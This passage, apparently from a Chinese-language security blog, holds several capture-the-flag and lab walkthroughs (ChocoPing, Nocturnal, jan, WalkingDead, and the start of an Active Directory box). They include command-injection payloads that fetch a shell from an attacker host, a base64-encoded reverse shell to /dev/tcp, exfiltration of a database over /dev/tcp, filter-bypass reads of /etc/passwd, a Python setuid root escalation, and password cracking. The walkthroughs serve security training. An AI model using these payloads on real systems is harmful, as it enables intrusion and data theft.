v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 21\r________________________________________________\rc%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4ms]\r%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca [Status: 200, Size: 126, Words: 11, Lines: 2, Duration: 4ms]\rcat+%60echo+-e+%22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%60 [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 3ms]\r:: Progress: [174/174] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:01] :: Errors: 0 :: ä¸¤è€…çš„åŒºåˆ«å°±åœ¨äºï¼Œwfuzzä¼šè‡ªåŠ¨è¿›è¡Œurlencodeï¼Œè€Œffuféœ€è¦æŒ‡å®šç¼–ç \nå°±è¿™é‡Œè€Œè¨€ï¼Œå‘½ä»¤çš„æ‰§è¡Œæ–¹å¼ç±»ä¼¼äºæŠŠæ‰€æœ‰å­—ç¬¦å‰é¢åŠ ä¸Šä¸€ä¸ªæ–œæ \n\\u\\n\\a\\m\\e \\-\\a ç»è¿‡æµ‹è¯•ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªå•è¯éœ€è¦è¿™æ ·åš\nhttp://172.17.0.2/ping.php?ip=127.0.0.1;\\c\\u\\r\\l%20172.17.0.1/shell%20-O%20/tmp/shell æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯penelopeçš„payload\nhttp://172.17.0.2/ping.php?ip=127.0.0.1;\\p\\r\\i\\n\\t\\f%20%20KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0ICAwPiYxKSAm|base64%20-d%20|%20bash éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœURLä¸­å­˜åœ¨base64ç¼–ç çš„è¯ï¼Œè¦å°½é‡é¿å…åŠ å·å’Œä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œå› ä¸ºä¼šè¢«è½¬ä¹‰\næ¯”å¦‚è¿™é‡Œæˆ‘å°±ä¿®æ”¹äº†ä¸€ä¸‹ä»–çš„payloadï¼Œé€šè¿‡è°ƒæ•´å…¶ä¸­çš„ç©ºæ ¼é—´è·æ¥æ¶ˆé™¤åŠ å·å’Œç­‰å·\nOwn balutin #\rwww-data@df356a56c13a:/var/www$ sudo -l\rMatching Defaults entries for www-data on df356a56c13a:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser www-data may run the following commands on df356a56c13a:\r(balutin) NOPASSWD: /usr/bin/man man | GTFOBins Root #\rå°è¯•çˆ†ç ´è¿™ä¸ªå‹ç¼©åŒ…çš„å¯†ç \n[root@kali] /home/kali/Chocoping â¯ zip2john secretito.zip \u0026gt;\u0026gt; zip.hash [root@kali] /home/kali/Chocoping â¯ john zip.hash /usr/share/wordlists/rockyou.txt å¾—åˆ°å¯†ç æ˜¯chocolate\nä½¿ç”¨wiresharkä¸€ä¸‹å°±èƒ½çœ‹åˆ°å¯†ç äº†\n[root@kali] /home/kali/Chocoping â¯ strings traffic.pcap POST /login HTTP/1.1\rHost: ejemplo.com\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 29\rusername=root\u0026amp;password=secretitosecretazo!\rGET /private HTTP/1.1\rAuthorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=\rHost: ejemplo.com Summary #\rUserï¼šä¸»è¦æ˜¯ä½¿ç”¨ffufçš„æ—¶å€™æ³¨æ„ä¸€ä¸‹urlç¼–ç \nRootï¼šzipå‹ç¼©åŒ…çˆ†ç ´\n","date":"2025-04-15","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-chocoping/","section":"Posts","summary":"","title":"Dockerlabs-ChocoPing","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Nocturnal â¯ nmap Nocturnal.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)\r| 256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)\r|_ 256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)\r80/tcp open http nginx 1.18.0 (Ubuntu)\r| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set\r|_http-title: Welcome to Nocturnal\r|_http-server-header: nginx/1.18.0 (Ubuntu) User #\rä»»æ„æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œç„¶åç™»å½•ï¼Œå¯ä»¥ä¸Šä¼ ä¸€äº›æ–‡ä»¶\næŸ¥çœ‹åˆ°ä¸‹è½½é“¾æ¥æ˜¯è¿™æ ·çš„æ ¼å¼\nhttp://nocturnal.htb/view.php?username=aaa\u0026amp;file=2023.xlsx å¦‚æœæ˜¯é€šè¿‡URLé‡Œæ¥è·å–åˆ°ç”¨æˆ·åçš„è¯ï¼Œè¿™é‡Œå¯ä»¥è¿›è¡Œä¸€ä¸‹ç”¨æˆ·çš„æšä¸¾\n[root@kali] /home/kali/Nocturnal â¯ ffuf -u \u0026#39;http://nocturnal.htb/view.php?username=FUZZ\u0026amp;file=2023.xlsx\u0026#39; -w ../Desktop/fuzzDicts/userNameDict/user.txt -H \u0026#39;Cookie: PHPSESSID=k381a2of6lftuk6gnab5f5sapa\u0026#39; -fs 2985\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://nocturnal.htb/view.php?username=FUZZ\u0026amp;file=2023.xlsx\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/userNameDict/user.txt\r:: Header : Cookie: PHPSESSID=k381a2of6lftuk6gnab5f5sapa\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 2985\r________________________________________________\radmin [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 72ms]\ramanda [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 70ms]\rtobias [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 69ms]\r:: Progress: [8886/8886] :: Job [1/1] :: 335 req/sec :: Duration: [0:00:17] :: Errors: 0 :: å¯ä»¥çœ‹åˆ°æœ‰è¿™å‡ ä¸ªç”¨æˆ·æ˜¯æœ‰ç‰¹æ®Šå›æ˜¾çš„ï¼Œå…¶ä¸­æŸ¥çœ‹amandaçš„æ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸€ä¸ªprivacy.odt\n[root@kali] /home/kali/Nocturnal â¯ file privacy.odt â\rprivacy.odt: Zip archive, with extra data prepended å‘ç°æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ç±»å‹çš„æ–‡ä»¶ï¼Œå°†å…¶è§£å‹åæŸ¥æ‰¾ä¸€ä¸‹å¯†ç \nå¯ä»¥ç™»å½•åˆ°åå°ï¼Œè¿›åˆ°adminç•Œé¢\næ»‘åˆ°æœ€ä¸‹é¢ï¼Œç”¨å¯†ç åˆ›å»ºå¤‡ä»½å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶\nä¸‹è½½ä¸‹æ¥è¿›è¡Œè§£å‹ï¼ŒåŒæ ·ä½¿ç”¨amandaçš„å¯†ç ï¼Œè·å–åˆ°å¯†ç hash\nå…¶ä¸­tobiasçš„å¯†ç æ˜¯å¯ä»¥ç ´è§£æˆåŠŸçš„\nUpdated #\råœ¨æ›´æ–°ä¹‹åï¼Œæ•°æ®åº“æ–‡ä»¶å°±ä¸å­˜åœ¨äº†ï¼Œå› æ­¤å°è¯•å®¡è®¡ä»£ç \nåœ¨admin.phpä¸­ï¼Œèƒ½å‘ç°passwordå­—æ®µæ˜¯ç›´æ¥æ‹¼æ¥åˆ°commandé‡Œé¢çš„\nfunction cleanEntry($entry) {\r$blacklist_chars = [\u0026#39;;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;\u0026amp;\u0026amp;\u0026#39;];\rforeach ($blacklist_chars as $char) {\rif (strpos($entry, $char) !== false) {\rreturn false; // Malicious input detected\r}\r}\rreturn htmlspecialchars($entry, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;);\r}\r\u0026lt;?php\rif (isset($_POST[\u0026#39;backup\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;])) {\r$password = cleanEntry($_POST[\u0026#39;password\u0026#39;]);\r$backupFile = \u0026#34;backups/backup_\u0026#34; . date(\u0026#39;Y-m-d\u0026#39;) . \u0026#34;.zip\u0026#34;;\rif ($password === false) {\recho \u0026#34;\u0026lt;div class=\u0026#39;error-message\u0026#39;\u0026gt;Error: Try another password.\u0026lt;/div\u0026gt;\u0026#34;;\r} else {\r$logFile = \u0026#39;/tmp/backup_\u0026#39; . uniqid() . \u0026#39;.log\u0026#39;;\r$command = \u0026#34;zip -x \u0026#39;./backups/*\u0026#39; -r -P \u0026#34; . $password . \u0026#34; \u0026#34; . $backupFile . \u0026#34; . \u0026gt; \u0026#34; . $logFile . \u0026#34; 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;;\r$descriptor_spec = [\r0 =\u0026gt; [\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;], // stdin\r1 =\u0026gt; [\u0026#34;file\u0026#34;, $logFile, \u0026#34;w\u0026#34;], // stdout\r2 =\u0026gt; [\u0026#34;file\u0026#34;, $logFile, \u0026#34;w\u0026#34;], // stderr\r];\r$process = proc_open($command, $descriptor_spec, $pipes);\rif (is_resource($process)) {\rproc_close($process);\r}\rsleep(2);\r$logContents = file_get_contents($logFile);\rif (strpos($logContents, \u0026#39;zip error\u0026#39;) === false) {\recho \u0026#34;\u0026lt;div class=\u0026#39;backup-success\u0026#39;\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;p\u0026gt;Backup created successfully.\u0026lt;/p\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;a href=\u0026#39;\u0026#34;a . htmlspecialchars($backupFile) . \u0026#34;\u0026#39; class=\u0026#39;download-button\u0026#39; download\u0026gt;Download Backup\u0026lt;/a\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;h3\u0026gt;Output:\u0026lt;/h3\u0026gt;\u0026lt;pre\u0026gt;\u0026#34; . htmlspecialchars($logContents) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;;\r} else {\recho \u0026#34;\u0026lt;div class=\u0026#39;error-message\u0026#39;\u0026gt;Error creating the backup.\u0026lt;/div\u0026gt;\u0026#34;;\r}\runlink($logFile);\r}\r}\r?\u0026gt; ä½¿ç”¨**%0aæ¢è¡Œï¼Œç”¨%09**ä»£æ›¿ç©ºæ ¼ï¼Œå³å¯å‘½ä»¤æ‰§è¡Œ\npassword=%0Abash%09-c%09\u0026#34;id\u0026#34;%0A\u0026amp;backup= ä¸‹è½½shellæ–‡ä»¶\npassword=%0Abash%09-c%09\u0026#34;wget%0910.xx.xx.xx/shell\u0026#34;%0A\u0026amp;backup=\rpassword=%0Abash%09-c%09\u0026#34;bash%09shell\u0026#34;%0A\u0026amp;backup= www-data@nocturnal:~/nocturnal_database$ cat nocturnal_database.db \u0026gt; /dev/tcp/10.xx.xx.xx/8888\r[root@kali] /home/kali/Nocturnal â¯ nc -lvnp 8888 \u0026gt; nocturnal_database.db åŒæ ·æ‹¿åˆ°æ•°æ®åº“æ–‡ä»¶\nRoot #\rå‘ç°æœ‰å†…ç½‘8080ç«¯å£\n[root@kali] /home/kali/Nocturnal â¯ ssh tobias@nocturnal.htb -L 9090:127.0.0.1:8080 å‘ç°æ˜¯ä¸€ä¸ªispconfigæœåŠ¡\nçŒœæµ‹ç‰ˆæœ¬å¯èƒ½æ˜¯3.2\nå°è¯•æœç´¢ä¸€ä¸‹ï¼Œä¼¼ä¹å­˜åœ¨è¿™ä¸ªCVE-2023-46818çš„æ¼æ´\nğŸ’€ Exploit for Code Injection in Ispconfig CVE-2023-46818\nbipbopbup/CVE-2023-46818-python-exploit: CVE-2023-46818 IPSConfig Python exploit\nåŒæ ·å°è¯•å¯†ç å¤ç”¨çš„é—®é¢˜ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå¾—åˆ°Root\nSummary #\rUserï¼šURLä¼ å‚å¯¼è‡´çš„ç”¨æˆ·åæšä¸¾é—®é¢˜ï¼ŒæŸ¥åˆ°amandaçš„å¯†ç ã€‚ç™»å½•åˆ°åå°è¿›è¡Œå¤‡ä»½æ‹¿åˆ°æ•°æ®åº“æ–‡ä»¶ï¼Œè§£å¯†å¾—åˆ°tobiasçš„ç”¨æˆ·å¯†ç ã€‚\nRootï¼šå†…ç½‘ç«¯å£8080è¿è¡Œç€ispconfigæœåŠ¡ï¼Œæ ¹æ®ç‰ˆæœ¬æŸ¥æ‰¾expï¼Œææƒåˆ°rootã€‚\n","date":"2025-04-14","externalUrl":null,"permalink":"/posts/2025/04/htb-nocturnal/","section":"Posts","summary":"","title":"HTB-Nocturnal","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.144 -p-\rPORT STATE SERVICE\r22/tcp open ssh\r8080/tcp open http-proxy Gobuster #\r[root@kali] /home/kali â¯ gobuster dir -u http://192.168.56.144:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt --exclude-length 45\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.144:8080/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] Exclude Length: 45\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/redirect (Status: 400) [Size: 24]\r/robots.txt (Status: 200) [Size: 16]\rProgress: 97322 / 882244 (11.03%)^C\r[!] Keyboard interrupt detected, terminating.\rProgress: 100724 / 882244 (11.42%)\r===============================================================\rFinished\r=============================================================== å‘ç°ä¸€ä¸ª**/redirectè·¯ç”±ï¼Œå¹¶ä¸”éœ€è¦url**å‚æ•°\nhttp://192.168.56.144:8080/robots.txt\r/redirect\r/credz å°è¯•è¿›è¡Œå°†urlå‚æ•°èµ‹å€¼ä¸º**/credz**\nè¿™é‡Œåº”è¯¥æ˜¯å­˜åœ¨ä¸€ä¸ªå‚æ•°è¦†ç›–çš„é—®é¢˜\nhttp://192.168.56.144:8080/redirect?url=/credz\u0026amp;url=/credz\r#å¾—åˆ°å‡­è¯\rssh/EazyLOL Root #\rjan:/opt$ sudo -l\rMatching Defaults entries for ssh on jan:\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rRunas and Command-specific defaults for ssh:\rDefaults!/usr/sbin/visudo env_keep+=\u0026#34;SUDO_EDITOR EDITOR VISUAL\u0026#34;\rUser ssh may run the following commands on jan:\r(root) NOPASSWD: /sbin/service sshd restart å‘ç°é…ç½®æ–‡ä»¶æ˜¯å¯ä»¥å†™å…¥çš„\nä¿®æ”¹**/etc/ssh/sshd_configçš„banner**\nç„¶åé‡å¯æœåŠ¡ï¼Œå°è¯•sshç™»å½•rootï¼Œå¯ä»¥è¯»å–\nè¦è·å–åˆ°Rootshellçš„è¯ï¼Œéœ€è¦ä¿®æ”¹ä¸‹é¢å‡ ä¸ªåœ°æ–¹\nå…¶ä¸­keyæ˜¯ä»kaliä¸­çš„å…¬é’¥ä¸­è·å–åˆ°çš„\nSummary #\rUserï¼šé€šè¿‡å˜é‡è¦†ç›–è§£æè·å–åˆ°sshç™»å½•å‡­è¯ã€‚\nRootï¼šä¿®æ”¹sshé…ç½®æ–‡ä»¶ä¸­çš„é»˜è®¤å¯†é’¥ä½ç½®ï¼Œè·å–åˆ°root\n","date":"2025-04-09","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-jan/","section":"Posts","summary":"","title":"HackMyVM-jan","type":"posts"},{"content":"ã€ŠThe Walking Deadã€‹åˆå«åšã€Šè¡Œå°¸èµ°è‚‰ã€‹ï¼Œæ˜¯ä¸€éƒ¨æ›´äº†åå¤šå¹´çš„ç¾å‰§ï¼Œæˆ‘æ˜¯å…¨éƒ¨çœ‹å®Œäº†çš„ï¼Œåˆšå¥½æœ‰è¿™ä¸ªé¶æœºï¼Œé‚£ä¹ˆè‚¯å®šå¾—æ‰“ä¸€ä¸‹ã€‚\nBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)\r| 256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)\r|_ 256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-title: The Walking Dead - CTF è®¿é—®ç½‘é¡µï¼Œå‘ç°æœ‰ä¸€ä¸ªéšè—çš„shell.php\n[root@kali] /home/kali â¯ curl 172.17.0.2 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;es\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;The Walking Dead - CTF\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { background-color: black; color: red; font-family: \u0026#39;Courier New\u0026#39;, monospace; text-align: center; margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; } h1 { font-size: 50px; text-shadow: 3px 3px 10px darkred; } p { font-size: 20px; } .blood-drip { font-size: 25px; text-shadow: 3px 3px 10px darkred; animation: blink 1s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.5; } } audio { margin-top: 20px; } .hidden-link { display: none; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;The Walking Dead - CTF\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;blood-drip\u0026#34;\u0026gt;Survive... if you can.\u0026lt;/p\u0026gt; \u0026lt;audio autoplay loop\u0026gt; \u0026lt;source src=\u0026#34;walking_dead_theme.mp3\u0026#34; type=\u0026#34;audio/mpeg\u0026#34;\u0026gt; Tu navegador no soporta el audio. \u0026lt;/audio\u0026gt; \u0026lt;p class=\u0026#34;hidden-link\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;hidden/.shell.php\u0026#34;\u0026gt;Access Panel\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Param Fuzz #\rå°è¯•å¯¹å‚æ•°è¿›è¡Œçˆ†ç ´\n[root@kali] /home/kali â¯ ffuf -u \u0026#39;http://172.17.0.2/hidden/.shell.php?FUZZ=id\u0026#39; -w ./Desktop/fuzzDicts/paramDict/AllParam.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://172.17.0.2/hidden/.shell.php?FUZZ=id\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\rcmd [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 3ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 18181 req/sec :: Duration: [0:00:04] :: Errors: 0 :: è¿™é‡Œåˆšå¥½è¯•ç”¨ä¸€ä¸‹ç¾¤å‹æ¨èçš„å·¥å…·\nbrightio/penelope: Penelope Shell Handler Linpeas #\rå¯ä»¥ç›´æ¥ææƒ\n/usr/bin/python3.8 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;bash\u0026#34;)\u0026#39; Summary #\rä¼¼ä¹æ˜¯æœ‰ç‚¹å¤ªè¿‡ç®€å•äº†\n","date":"2025-04-08","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-walkingdead/","section":"Posts","summary":"","title":"Dockerlabs-WalkingDead","type":"posts"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/tags/thehackerslabs/","section":"Tags","summary":"","title":"Thehackerslabs","type":"tags"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/categories/thehackerslabs/","section":"Categories","summary":"","title":"Thehackerslabs","type":"categories"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.10 -sV -A -p-\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r80/tcp open http Microsoft IIS httpd 10.0\r| http-methods: |_ Potentially risky methods: TRACE\r|_http-server-header: Microsoft-IIS/10.0\r|_http-title: Neptune 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-08 07:26:35Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-server-header: Microsoft-HTTPAPI/2.0\r|_http-title: Not Found\r9389/tcp open mc-nmf .NET Message Framing\r49664/tcp open msrpc Microsoft Windows RPC\r49670/tcp open msrpc Microsoft Windows RPC\r53459/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r53460/tcp open msrpc Microsoft Windows RPC\r53470/tcp open msrpc Microsoft Windows RPC\r53479/tcp open msrpc Microsoft Windows RPC\rMAC Address: 08:00:27:37:4E:C0 (Oracle VirtualBox virtual NIC)\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rDevice type: general purpose\rRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\rOS CPE: cpe:/o:microsoft:windows_server_2016\rAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 1 hop\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-time: | date: 2025-04-08T07:27:27\r|_ start_date: N/A\r|_nbstat: NetBIOS name: DC01, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:37:4e:c0 (Oracle VirtualBox virtual NIC)\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required ä¿®æ”¹**/etc/hosts**\n127.0.0.1 localhost\r127.0.1.1 kali\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r192.168.56.10 neptune.thl dc01.neptune.thl User Enum #\rè¿™é‡Œå­˜åœ¨ä¸€ä¸ªPDFçš„è®¿é—®é“¾æ¥ï¼Œå¹¶ä¸”æ˜¯ä»¥æ—¶é—´ä½œä¸ºæ–‡ä»¶åæ ¼å¼ï¼Œå› æ­¤å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬è¿›è¡Œéå†\nimport os\rimport requests\rfrom datetime import datetime, timedelta\rbase_url = \u0026#34;http://neptune.thl/docs/{date}.pdf\u0026#34;\rstart_date = datetime(2023, 1, 1)\rend_date = datetime(2025, 12, 31)\rsave_dir = \u0026#34;downloads\u0026#34;\ros.makedirs(save_dir, exist_ok=True)\rcurrent = start_date\rwhile current \u0026lt;= end_date:\rdate_str = current.strftime(\u0026#34;%Y-%m-%d\u0026#34;)\rurl = base_url.format(date=date_str)\rfilename = os.path.join(save_dir, f\u0026#34;{date_str}.pdf\u0026#34;)\rtry:\rresponse = requests.get(url, timeout=10)\rif response.status_code == 200:\rwith open(filename, \u0026#34;wb\u0026#34;) as f:\rf.write(response.content)\rprint(f\u0026#34;Downloaded: {date_str}\u0026#34;)\relse:\rprint(f\u0026#34;Not found: {date_str}\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;Error on {date_str}: {e}\u0026#34;)\rcurrent += timedelta(days=1) å†ç”¨exiftoolæå–ç”¨æˆ·å\nexiftool -Creator -s3 *.pdf | grep -v \u0026#39;^========\u0026#39; |sort | uniq \u0026gt; names.txt ç”¨kerbruteè¿›è¡Œç”¨æˆ·æšä¸¾\n[root@kali] /home/kali/BlackGOld â¯ kerbrute userenum -d neptune.thl ./names.txt --dc 192.168.56.10 __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 04/08/25 - Ronnie Flathers @ropnop\r2025/04/08 15:56:26 \u0026gt; Using KDC(s):\r2025/04/08 15:56:26 \u0026gt; 192.168.56.10:88\r2025/04/08 15:56:26 \u0026gt; [+] VALID USERNAME: Lucas.Miller@neptune.thl\r2025/04/08 15:56:26 \u0026gt; Done! Tested 87 usernames (1 valid) in 0.022 seconds è¿™é‡Œçˆ†ç ´å¯†ç å¤±è´¥ï¼Œå°è¯•åœ¨pdfä¸­å¯»æ‰¾å¯†ç \n[root@kali] /home/kali/BlackGOld/downloads â¯ pdfgrep -i \u0026#39;Lucas\u0026#39; ./* â\r./2023-01-12.pdf:Estimado Lucas Miller,\r./2023-01-12.pdf: â— Nombre de usuario (Usuario AD): lucas.miller@neptune.thl å¾—åˆ°å¯†ç æ˜¯ï¼šE@6q%TnR7UEQSXywr8^@\nBloodhound #\r[root@kali] /home/kali/BlackGOld â¯ bloodhound-python -u \u0026#39;Lucas.Miller\u0026#39; -p \u0026#39;E@6q%TnR7UEQSXywr8^@\u0026#39; -d neptune.thl -ns 192.168.56.10 -c all --zip INFO: Found AD domain: neptune.thl\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.neptune.thl\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.neptune.thl\rINFO: Found 8 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.neptune.thl\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250408160411_bloodhound.zip æ‰¾åˆ°ä¸€äº›å…¶ä»–ç”¨æˆ·\nOwn Victor #\ré€šè¿‡RPCæŸ¥è¯¢åˆ°Victorçš„å¯†ç \næ›´æ–°ä¸€ä¸‹bloodhound\n[root@kali] /home/kali â¯ bloodhound-python -u \u0026#39;VICTOR.RODRIGUEZ\u0026#39; -p \u0026#39;H5gVCzzZkzJ#wGsT8u1$\u0026#39; -d neptune.thl -ns 192.168.56.10 -c all --zip\rINFO: Found AD domain: neptune.thl\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: 